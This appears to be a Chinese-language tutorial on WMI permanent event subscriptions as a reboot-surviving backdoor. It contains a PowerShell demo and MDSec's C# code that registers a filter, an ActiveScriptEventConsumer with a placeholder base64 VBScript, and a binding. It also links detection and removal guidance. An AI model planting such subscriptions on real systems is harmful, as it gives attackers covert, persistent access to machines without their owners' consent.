## WMIC订阅永久事件 ##
wmic创建的事件可用于做为后门来使用，如若不删除话。重启也会存在

### 查WMI ###
WMI提供了一种类似于SQL查询的语句来进行查询，WQL可分为几大类
Instance Queries (实例查询) ： 查询WMI对象实例
Event Queries(事件查询)：等同于在WMI对象创建、修改、删除的时候注册一个信息
Meta Queries(元查询)：元查询用来获取WMI命名空间和类结构的元信息

### Instance Queries ###
最常用的WQL查询
语法格式如下：
```
select [Class property name | *] from [class name] <where [constraint]>
```

### Event Queries ###
事件查询被用作一种消息机制来监听事件的触发。通常用来在一个WMI对象被实例创建、修改、删除的时候给用户发送一个消息。根据消息的类型来定义
```
intrinsic (系统自带的)
extrinsic ()第三方的)

SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] <WHERE [CONSTRAINT]>
SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] <WHERE [CONSTRAINT]>
```

用于登录时会触发的事件
```
SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA 'Win32_LogonSession' AND TargetInstance.LogonType=2
```

每次用户在插入可移除设备时都会触发此事件：
```
SELECT * FROM Win32_VolumeChangeEvent Where EventType=2
```

每次创建 win32 进程时都会触发此事件：
```
Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"
```

###  Meta Queries ###
元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。

格式如下：
```
SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] <WHERE [CONSTRAINT]>
```

下面这个语句会查询所有以 WIN32 开头的WMI的类：
SELECT * FROM Meta_Class WHERE __CLASS LIKE "Win32%"

下面这个语句会查询某个命名空间下的所有命名空间：
SELECT Name FROM __NAMESPACE

注意：当不显示的指定命名空间时，默认的命名空间为ROOT\CIMV2。

### WMI事件 ###
为了能够安装一个永久性的 WMI 事件订阅，必须满足两个条件：

1、一个 __EventFilter 查询，它创建一个过滤器，为我们的特定事件选择触发器;
2、Event Consumer Class，代表一个事件触发时所执行的操作。在 Event Consumers（事件处理）中，可用的标准事件处理类：

```
LogFileEventConsumer： 将事件数据写入到指定的日志文件
ActiveScriptEventConsumer： 用来执行VBScript/JScript程序
NTEventLogEventConsumer：创建一个包含事件数据的日志入口点
SMTPEventConsumer：将事件数据用邮件发送
CommandLineEventConsumer：执行一条命令
```

### 创建一个触发事件和取消一个事件 ###
```
$query='Select * From __InstanceCreationEvent Within 5 Where TargetInstance Isa "Win32_Process"'
Register-WmiEvent -Query $query -Action {calc}
```
![](https://s2.ax1x.com/2019/06/08/VBRU9x.png)

创建一个win32的进程的时候就会执行calc

<b>清除事件</b>
使用Get-EventSubscriber可以查看创建的事件
![](https://s2.ax1x.com/2019/06/08/VBozSs.md.png)

执行Unregister-Event ID即可删除事件
![](https://s2.ax1x.com/2019/06/08/VBTSln.md.png)

### 使用C#创建一个在创建一个在创建特定流程时触发的事件 ###
```C#
// WMI Event Subscription Peristence Demo
// Author: @domchell

using System;
using System.Text;
using System.Management;

namespace WMIPersistence
{
    class Program
    {
        static void Main(string[] args)
        {
            PersistWMI();
        }

        static void PersistWMI()
        {
            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;

            string vbscript64 = "<INSIDE base64 encoded VBS here>";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +            
        "WHERE TargetInstance ISA \"Win32_Process\" " +           
        "AND TargetInstance.Name = \"notepad.exe\"";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "demoEventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "BadActiveScriptEventConsumer";
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbscript;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH
            Console.ReadKey();
        } // END FUNC
    } // END CLASS
} // END NAMESPACE
```
引用自：
[WMIPersistence/WMIPersist.cs at master · mdsecactivebreach/WMIPersistence · GitHub](https://github.com/mdsecactivebreach/WMIPersistence/blob/master/WMIPersist.cs)

创建持久性后门，使用C#调用WMI的API是最佳的选择

参考文章：
[Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event Subscription – MDSec](https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/)

[利用WMI构建无文件后门（基础篇）](https://paper.tuisec.win/detail/2db1594f4bc8047)

清除WMI后门：
[如何检测并清除WMI持久性后门 - 先知社区](https://xz.aliyun.com/t/2873)